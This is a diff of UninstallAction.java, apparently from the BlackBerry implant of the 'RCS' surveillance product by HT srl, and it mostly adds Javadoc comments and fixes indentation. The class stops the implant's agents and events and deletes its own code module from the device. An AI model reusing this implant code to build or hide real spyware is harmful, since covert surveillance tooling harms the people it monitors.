@@ -1,8 +1,8 @@
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSBlackBerry_lib 
- * File         : UninstallAction.java 
+ * Project      : RCS, RCSBlackBerry_lib
+ * File         : UninstallAction.java
  * Created      : 26-mar-2010
  * *************************************************/
 package blackberry.action;
@@ -16,8 +16,20 @@ import blackberry.log.LogCollector;
 import blackberry.log.Markup;
 import blackberry.utils.Check;
 
-public class UninstallAction extends SubAction {
+// TODO: Auto-generated Javadoc
+/**
+ * The Class UninstallAction.
+ */
+public final class UninstallAction extends SubAction {
 
+    /**
+     * Instantiates a new uninstall action.
+     * 
+     * @param actionId_
+     *            the action id_
+     * @param confParams
+     *            the conf params
+     */
     public UninstallAction(final int actionId_, final byte[] confParams) {
         super(actionId_);
         parse(confParams);
@@ -27,15 +39,25 @@ public class UninstallAction extends SubAction {
         // #endif
     }
 
+    /**
+     * Instantiates a new uninstall action.
+     * 
+     * @param host
+     *            the host
+     */
     public UninstallAction(final String host) {
         super(ACTION_UNINSTALL);
     }
 
+    /*
+     * (non-Javadoc)
+     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
+     */
     public boolean execute(final Event triggeringEvent) {
         // #debug info
-	debug.info("execute");
+        debug.info("execute");
 
-        this.wantUninstall = true;
+        wantUninstall = true;
 
         AgentManager.getInstance().stopAll();
         EventManager.getInstance().stopAll();
@@ -48,18 +70,18 @@ public class UninstallAction extends SubAction {
         final int moduleHandle = ad.getModuleHandle();
         final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
         //final String errorString = Integer.toString(rc);
-      //#debug info
-	debug.info("deleteModuleEx result: " + rc);
+        //#debug info
+        debug.info("deleteModuleEx result: " + rc);
         switch (rc) {
         case CodeModuleManager.CMM_OK_MODULE_MARKED_FOR_DELETION:
             // #debug info
-	debug.info("Will be deleted on restart");
+            debug.info("Will be deleted on restart");
             // Device.requestPowerOff( true );
             break;
         case CodeModuleManager.CMM_MODULE_IN_USE:
         case CodeModuleManager.CMM_MODULE_IN_USE_BY_PERSISTENT_STORE:
             // #debug info
-	debug.info("Module In Use");
+            debug.info("Module In Use");
             break;
         case CodeModuleManager.CMM_HANDLE_INVALID:
             // #debug
@@ -77,6 +99,10 @@ public class UninstallAction extends SubAction {
         return true;
     }
 
+    /*
+     * (non-Javadoc)
+     * @see blackberry.action.SubAction#parse(byte[])
+     */
     protected boolean parse(final byte[] confParams) {
 
         return true;
